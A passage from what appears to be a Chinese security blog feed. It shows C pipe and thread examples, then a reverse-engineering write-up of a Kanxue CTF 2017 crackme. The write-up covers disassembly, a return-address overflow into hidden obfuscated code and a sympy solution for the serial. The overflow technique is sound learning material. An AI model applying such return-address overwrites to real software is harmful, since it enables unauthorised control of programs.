class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">int</span> fd[<span class="number">2</span>];</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"> <span class="keyword">pid_t</span> pid;</div><div class="line"> <span class="keyword">if</span>(pipe(fd)&lt;<span class="number">0</span>)</div><div class="line"> &#123;</div><div class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line">    <span class="keyword">if</span>((pid=fork())&lt;<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>( pid&gt;<span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">        close(fd[<span class="number">0</span>]);</div><div class="line">        write(fd[<span class="number">1</span>],<span class="string">"hello\n"</span>,<span class="number">6</span>);</div><div class="line">        wait(<span class="literal">NULL</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        close(fd[<span class="number">1</span>]);</div><div class="line">        n=read(fd[<span class="number">0</span>],buff,<span class="number">128</span>);</div><div class="line">        write(STDOUT_FILENO,buff,n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><p>进程是资源分配的最小单位，而线程呢，则是CPU运行的最小单位。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></div><div class="line">  </div><div class="line"><span class="comment">//线程函数  </span></div><div class="line"><span class="function">DWORD WINAPI <span class="title">printThread</span><span class="params">(LPVOID lpParameter)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)  </div><div class="line">    &#123;         </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"sub thread - %d\n"</span>,i+(<span class="keyword">int</span>)lpParameter);  </div><div class="line">        Sleep(<span class="number">500</span>);  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])  </div><div class="line">&#123;  </div><div class="line">    <span class="comment">//创建一个线程，并让其挂起，不运行  </span></div><div class="line">    HANDLE hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, printThread, (LPVOID)<span class="number">10</span>, CREATE_SUSPENDED, <span class="number">0</span>);  </div><div class="line">  </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)  </div><div class="line">    &#123;  </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"main thread - %d\n"</span>, i + <span class="number">1</span>);  </div><div class="line">        <span class="comment">//当主线程输出到5的倍数时，恢复子线程运行  </span></div><div class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>)  </div><div class="line">        &#123;  </div><div class="line">            ResumeThread(hThread);  </div><div class="line">        &#125;  </div><div class="line">        <span class="comment">//当主线程输出到8的倍数时，暂停子线程运行  </span></div><div class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)  </div><div class="line">        &#123;  </div><div class="line">            SuspendThread(hThread);  </div><div class="line">        &#125;  </div><div class="line">        <span class="comment">//直接杀掉子线程  </span></div><div class="line">        <span class="comment">//TerminateThread(hThread,0);   </span></div><div class="line">        Sleep(<span class="number">500</span>);  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><h3 id="线程标识"><a href="#线程标识" class="headerlink" title="线程标识"></a>线程标识</h3><p>线程有ID, 但不是系统唯一, 而是进程环境中唯一有效.<br>线程的句柄是pthread_t类型, 该类型不能作为整数处理, 而是一个结构.</p><h3 id="线程退出的条件"><a href="#线程退出的条件" class="headerlink" title="线程退出的条件"></a>线程退出的条件</h3><p>下面任意一个都可以。<br>1.调用pthread_exit函数退出。<br>2.其他线程调用pthread_cancel取消该线程，且该线程可被取消。<br>3.创建线程的进程退出或者整个函数结束。<br>4.当前线程代码执行完毕。<br>5.其中的一个线程执行exec类函数执行新的代码，替换当前进程所有地址空间。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="keyword">pthread_mutex_t</span> mutex;</div><div class="line"><span class="keyword">pthread_cond_t</span> cond;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    pthread_cleanup_push(pthread_mutex_unlock,&amp;mutex);</div><div class="line">    <span class="comment">//提供函数回调保护</span></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread1 is running\n"</span>);</div><div class="line">        pthread_mutex_lock(&amp;mutex);</div><div class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread1 applied the condition\n"</span>);</div><div class="line">        pthread_mutex_unlock(&amp;mutex);</div><div class="line">        sleep(<span class="number">4</span>);</div><div class="line">    &#125;</div><div class="line">    pthread_cleanup_pop(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread2 is running\n"</span>);</div><div class="line">        pthread_mutex_lock(&amp;mutex);</div><div class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread2 applied the condition\n"</span>);</div><div class="line">        pthread_mutex_unlock(&amp;mutex);</div><div class="line">        sleep(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">pthread_t</span> thid1,thid2;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"condition variable study!\n"</span>);</div><div class="line">    pthread_mutex_init(&amp;mutex,<span class="literal">NULL</span>);</div><div class="line">    pthread_cond_init(&amp;cond,<span class="literal">NULL</span>);</div><div class="line">    pthread_create(&amp;thid1,<span class="literal">NULL</span>,(<span class="keyword">void</span>*)thread1,<span class="literal">NULL</span>);</div><div class="line">    pthread_create(&amp;thid2,<span class="literal">NULL</span>,(<span class="keyword">void</span>*)thread2,<span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">do</span>&#123;</div><div class="line">        pthread_cond_signal(&amp;cond);</div><div class="line">    &#125;<span class="keyword">while</span>(<span class="number">1</span>);</div><div class="line">    </div><div class="line">    sleep(<span class="number">20</span>);</div><div class="line">    pthread_exit(<span class="number">0</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">进程优点：编程、调试简单，可靠性较高。</div><div class="line">进程缺点：创建、销毁、切换速度慢，内存、资源占用大。</div><div class="line">线程优点：创建、销毁、切换速度快，内存、资源占用小。</div><div class="line">线程缺点：编程、调试复杂，可靠性较差。</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;进程与线程是最常用的方式&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>RE——看雪</title>
    <link href="http://yoursite.com/2018/05/09/re_kx1/"/>
    <id>http://yoursite.com/2018/05/09/re_kx1/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:02.119Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦,看雪论坛是个软件安全技术交流场所，为安全技术爱好者提供一个技术交流平台和资源。从单一版块『软件调试论坛』，发展到以软件安全技术为主题多个版块的综合论坛。其实这是一个超级大神级别的存在，来膜拜一波<br><a id="more"></a></p><h1 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h1><p>签到题直接过</p><h1 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h1><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1qXVQmok" target="_blank" rel="external">http://pan.baidu.com/s/1qXVQmok</a> 密码：h5sw<br>去年你已经知道看雪啦，只是不敢去做题，自己太菜了，今年去试一试，第一道题签到题，很开心。然而，第二题，我已经跪啦，不过，在公布wp后，还是学到了许多，这里记录一下学习到的知识。</p><h2 id="2、分析"><a href="#2、分析" class="headerlink" title="2、分析"></a>2、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，有明确提示成功和失败信息。<br>二、入坑：OD加载，查找字符，定位到：“You get it!”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">地址       反汇编                                    文本字符串</div><div class="line">00401000  /$  68 6CB04100   PUSH ctf2017_.0041B06C                   ;  \n Crackme for CTF2017 @Pediy.\n</div><div class="line">00401005  |.  E8 382D0100   CALL ctf2017_.00413D42</div><div class="line">0040100A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040100D  |.  C705 34B04100&gt;MOV DWORD PTR DS:[0x41B034],0x2          ;  2</div><div class="line">00401017  |.  E8 34000000   CALL ctf2017_.00401050                   ;  input</div><div class="line">0040101C  |.  E8 6F000000   CALL ctf2017_.00401090                   ;  check1</div><div class="line">00401021  |.  E8 BA000000   CALL ctf2017_.004010E0                   ;  check2</div><div class="line">00401026  |.  A1 34B04100   MOV EAX,DWORD PTR DS:[0x41B034]          ;  0</div><div class="line">0040102B  |.  85C0          TEST EAX,EAX</div><div class="line">0040102D  |.  75 10         JNZ Xctf2017_.0040103F</div><div class="line">0040102F  |.  68 5CB04100   PUSH ctf2017_.0041B05C                   ;  You get it!\n</div><div class="line">00401034  |.  E8 092D0100   CALL ctf2017_.00413D42</div><div class="line">00401039  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040103C  |.  33C0          XOR EAX,EAX</div><div class="line">0040103E  |.  C3            RETN</div><div class="line">0040103F  |&gt;  68 38B04100   PUSH ctf2017_.0041B038                   ;  Bad register-code, keep trying.\n</div><div class="line">00401044  |.  E8 F92C0100   CALL ctf2017_.00413D42</div><div class="line">00401049  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040104C  |.  33C0          XOR EAX,EAX</div><div class="line">0040104E  \.  C3            RETN</div><div class="line">0040104F      90            NOP</div><div class="line">00401050  /$  83EC 0C       SUB ESP,0xC</div><div class="line">00401053  |.  68 ACB04100   PUSH ctf2017_.0041B0AC                   ;   Coded by Fpc.\n\n</div><div class="line">00401058  |.  E8 E52C0100   CALL ctf2017_.00413D42</div><div class="line">0040105D  |.  83C4 04       ADD ESP,0x4</div><div class="line">00401060  |.  68 90B04100   PUSH ctf2017_.0041B090                   ;   Please input your code:</div><div class="line">00401065  |.  E8 D82C0100   CALL ctf2017_.00413D42</div><div class="line">0040106A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040106D  |.  8D4424 00     LEA EAX,DWORD PTR SS:[ESP]</div><div class="line">00401071  |.  50            PUSH EAX</div><div class="line">00401072  |.  68 8CB04100   PUSH ctf2017_.0041B08C                   ;  %s</div><div class="line">00401077  |.  E8 F72C0100   CALL ctf2017_.00413D73</div><div class="line">0040107C  |.  8D4424 08     LEA EAX,DWORD PTR SS:[ESP+0x8]</div><div class="line">00401080  |.  83C4 14       ADD ESP,0x14</div><div class="line">00401083  \.  C3            RETN</div></pre></td></tr></table></figure></p><p>简单跟踪几步发现 401090、4010E0 为显性算法比较，分析 401090、4010E0：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">void check1()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 5 * (v1 - v0) + v1 == 0x8F503A42 &amp;&amp; 13 * (v1 - v0) + v0 == 0xEF503A42 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div><div class="line">void check2()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 17 * (v1 - v0) + v1 == 0xF3A94883 &amp;&amp; 7 * (v1 - v0) + v0 == 0x33A94883 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p> 把输入每4个字符ASCII作为十六进制赋值计算，假设为a,b则：<br> ⑴：0x5 <em> ( a - b ) + a == 0x8F503A42<br> ⑵：0xD </em> ( a - b ) + b == 0xEF503A42<br> ⑶：0x11 <em> ( a - b ) + a == 0xF3A94883<br> ⑷：0x7 </em> ( a - b ) + b == 0x33A94883<br>然而我分析到这里，感觉只能穷举。。。。结果当然失败了<br>后来看了大佬们的wp，果然学到了许多<br>大佬1：考虑该显性算法未随机打乱数值，低位特征依然继承到计算结果，因此先尝试求解低位，再逐个往高位求解，避免穷举范围过大：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">def solve_false():</div><div class="line">    start_time = time.clock()</div><div class="line">    for a1 in range(0x30,0x7b):</div><div class="line">        for b1 in range(0x30,0x7b):</div><div class="line">            if (0x5 * (a1 - b1) + a1) &amp; 0xff == 0x42:</div><div class="line">                if (0xd * (a1 - b1) + b1) &amp; 0xff == 0x42:</div><div class="line">                    if (0x11 *(a1 - b1) + a1) &amp; 0xff == 0x83:</div><div class="line">                        if (0x7 * (a1 - b1) + b1) &amp; 0xff == 0x83:</div><div class="line">                            print (&quot;found sn a1 : %x&quot; % a1)</div><div class="line">                            print (&quot;found sn b1 : %x&quot; % b1)</div><div class="line">    print (&apos;use time: %.3f second&apos; % (time.clock()-start_time))</div><div class="line">    return</div></pre></td></tr></table></figure></p><p>迅速识别该方程组无合法答案，无疑是作者埋的坑，立即寻找其他途径。<br>大佬2:z3识别改方程组无解（这里我还是没有懂，z3太强大啦）<br>大佬3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x11 * ( a - b ) + a == 0xF3A94883</div><div class="line">0x5 * ( a - b ) + a == 0x8F503A42</div></pre></td></tr></table></figure></p><p>推出:<br><code>12 * ( a - b ) == 0x64590d41</code><br>右边为偶数，左边为奇数，无解</p><p>这道题由于没有判断输入长度，便存在溢出（这里我完全没有想打RE，还有溢出，涨知识了），那溢出到哪里呢？,大佬们发现0x00413131存在shellcode编码（膜拜），溢出到这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">.text:0040112B                 db 5 dup(90h)</div><div class="line">.text:00401130                 dd 4800h dup(0)</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413130                 retn</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413131                 db 83h, 0C4h, 0F0h</div><div class="line">.text:00413134                 dd 20712A70h, 0F1C75F2h, 28741C71h, 2E0671DDh, 870F574h</div><div class="line">.text:00413134                 dd 74F17169h, 0DC167002h, 0EA74C033h, 0DC261275h, 0F471E771h</div><div class="line">.text:00413134                 dd 6903740Fh, 0EB75EB70h, 0FDF7069h, 22712C70h, 0B8261F7Dh</div><div class="line">.text:00413134                 dd 2B741E71h, 3E067169h, 870F57Ch, 7CF17169h, 0DC197002h</div><div class="line">.text:00413134                 dd 41B034A3h, 75E77400h, 0E571DC12h, 7CDCF271h, 0E9706903h</div><div class="line">.text:00413134                 dd 6965E97Dh, 70B8DC70h, 3E1D7127h, 710F1971h, 0DD257019h</div><div class="line">.text:00413134                 dd 0F6700571h, 71DD0870h, 700270F2h, 70580F14h, 0F1171ECh</div><div class="line">.text:00413134                 dd 0F671EA71h, 0DD03700Fh, 0ED71ED70h, 0FE170DDh, 7F36217Eh</div><div class="line">.text:00413134                 dd 671A7D27h, 1D2A74B8h, 65690D7Eh, 67C067Fh, 1D361C7Eh</div><div class="line">.text:00413134                 dd 8BDC0E7Fh, 75EA74C8h, 7E69DC14h, 0C1F47FEFh, 0F97CFB7Fh</div><div class="line">.text:00413134                 dd 0EA7DE27Fh, 0D87E6965h, 772076B8h, 2E1A7F27h, 0DD2978B8h</div><div class="line">.text:00413134                 dd 778D0D76h, 67EF207h, 0DD261B76h, 58B80E77h, 1479EB78h</div><div class="line">.text:00413134                 dd 768DB865h, 0FF477EFh, 0F97EFB77h, 0EA7FE177h, 0B8D9768Dh</div><div class="line">.text:00413134                 dd 73F22372h, 1C756729h, 0DD2C740Fh, 66690E72h, 6740673h</div><div class="line">.text:00413134                 dd 0DD361E72h, 0DD261073h, 0E974D88Bh, 12751575h, 73ED72DCh</div><div class="line">.text:00413134                 dd 0FB730FF3h, 0E073F974h, 6966E875h, 740FD672h, 2E1D7527h</div><div class="line">.text:00413134                 dd 75DC1973h, 0DD267C19h, 742E0475h, 0F3751D08h, 16740272h</div><div class="line">.text:00413134                 dd 0ED7C58C1h, 0C1F3137Dh, 0F575EA75h, 1D03720Fh, 0EC73EC74h</div><div class="line">.text:00413134                 dd 0DF741D66h, 0F23EBDCh, 0EB227585h, 85261DFAh, 74D08B29h</div><div class="line">.text:00413134                 dd 0EBF6EB18h, 75D08BF4h, 32F2EBECh, 0E9754A3Eh, 6256F2EBh</div><div class="line">.text:00413134                 dd 0EDEB7A6Eh, 7D267C7Ah, 187DF21Ch, 70187D0Fh, 37D1D25h</div><div class="line">.text:00413134                 dd 7D69087Ch, 7C027CF4h, 0C18BDC16h, 1271ED70h, 7DEB7DDCh</div><div class="line">.text:00413134                 dd 37CC1F5h, 7DEC7C69h, 7C6966ECh, 2A780FDFh, 793E2079h</div><div class="line">.text:00413134                 dd 1C79B81Ch, 798D2874h, 0F5783606h, 79DD0878h, 780278F1h</div><div class="line">.text:00413134                 dd 0C32B0F16h, 1275EA74h, 0E7790F2Eh, 78B8F479h, 0EB78DD03h</div><div class="line">.text:00413134                 dd 78DDEB79h, 2B70B8DFh, 79662271h, 1E71C11Eh, 71692A70h</div><div class="line">.text:00413134                 dd 70F67805h, 0F271DD08h, 19700278h, 2E0C10Fh, 1471EA70h</div><div class="line">.text:00413134                 dd 0F107966h, 0F171E571h, 700278DCh, 36E979E9h, 0C1DC70DDh</div><div class="line">.text:00413134                 dd 22712B70h, 0B81E7326h, 29781E71h, 571DD3Eh, 870F572h</div><div class="line">.text:00413134                 dd 72F1711Dh, 0C1177002h, 0EA78C103h, 733E1379h, 0E671C10Fh</div></pre></td></tr></table></figure></p><p>那溢出长度是多少呢？输入aaaabbbbccccddddeeee,发现返回地址是dddd,<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzsu500uj31440g1q7v.jpg" alt=""><br>再次输入aaaabbbbccc11A<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzvguj53j31h20guady.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzw6hh09j319v08rabc.jpg" alt=""><br>黑色，这里右键-分析-从模块删除分析<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fkxzzfg35gj31ah0bwgod.jpg" alt=""><br>这里出现花指令(代码混淆，花指令不影响程序运行。就是看耐心。就拿这个题目来说。花指令就是跳来跳去。可以脱去，其实不脱话也一样的)<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fky059od5wj30k309zq4f.jpg" alt=""><br>一步一步分析<br>在0x413131位置设置新断点，回车断下，忽略花指令，仅摘录算法相关代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00413131    83C4 F0         add esp,-0x10</div><div class="line">00413150    33C0            xor eax,eax</div><div class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax </div><div class="line">004131BA    58              pop eax          //aaaa</div><div class="line">004131EB    8BC8            mov ecx,eax</div><div class="line">0041321F    58              pop eax     //bbbb</div><div class="line">00413254    8BD8            mov ebx,eax</div><div class="line">00413289    58              pop eax   //cccc</div><div class="line">004132B5    8BD0            mov edx,eax</div><div class="line">004132AD    8BD0            mov edx,eax</div><div class="line">004132E2    8BC1            mov eax,ecx  //eax=aaaa</div><div class="line">00413316    2BC3            sub eax,ebx   //ebx=bbbb eax=a-b</div><div class="line">00413349    C1E0 02         shl eax,0x2    //(a-b)*4</div><div class="line">00413380    03C1            add eax,ecx     //(a-b)*4+a</div><div class="line">004133B5    03C2            add eax,edx     //(a-b)*4+a+c</div><div class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2   ///0xEAF917E2==((a-b)*4+a+c)</div><div class="line"></div><div class="line">00413B1E    58              pop eax                ; ctf2017_.00413E3E</div><div class="line">00413B4E    35 0E210100     xor eax,0x1210E</div><div class="line">00413B83    3305 34B04100   xor eax,dword ptr ds:[0x41B034]</div><div class="line">0040103F    68 38B04100     push ctf2017_.0041B038         &quot;Bad register-code&quot;</div><div class="line"></div><div class="line">00413455    03C1            add eax,ecx     //ecx=aaaa</div><div class="line">00413489    2BC3            sub eax,ebx    //ebx=bbbb</div><div class="line">004134BF    8BD8            mov ebx,eax    //ebx=eax=a-b</div><div class="line">004134F3    D1E0            shl eax,1   //(a-b)*2</div><div class="line">00413525    03C3            add eax,ebx  //(a-b)*3</div><div class="line">00413559    03C1            add eax,ecx   //(a-b)*3+a</div><div class="line">0041358F    8BC8            mov ecx,eax //</div><div class="line">004135C3    03C2            add eax,edx   //(a-b)*3+a+c</div><div class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8 //(a-b)*3+a+c==0xE8F508C8</div><div class="line"></div><div class="line">00413665    8BC1            mov eax,ecx</div><div class="line">0041365D    8BC1            mov eax,ecx //(a-b)*3+a</div><div class="line">004136A7    2BC2            sub eax,edx  //(a-b)*3+a-c</div><div class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68 // (a-b)*3+a-c==0xC0A3C68</div></pre></td></tr></table></figure></p><p>3、求解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(a-b)*3+a-c==0xC0A3C68</div><div class="line">(a-b)*3+a+c==0xE8F508C8</div><div class="line">(a-b)*4+a+c==0xEAF917E2</div></pre></td></tr></table></figure></p><p>以参考了许多大神的代码<br>学到了一种解决方程的方法，贼好用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from sympy import *</div><div class="line">a=Symbol(&apos;a&apos;)</div><div class="line">b=Symbol(&apos;b&apos;)</div><div class="line">c=Symbol(&apos;c&apos;)</div><div class="line">print (solve([(a-b)*3+a-c-0xC0A3C68,(a-b)*3+a+c-0xE8F508C8,(a-b)*4+a+c-0xEAF917E2],[a,b,c]))</div></pre></td></tr></table></figure></p><h1 id="3、Re3"><a href="#3、Re3" class="headerlink" title="3、Re3"></a>3、Re3</h1><h2 id="1、题目-1"><a href="#1、题目-1" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" 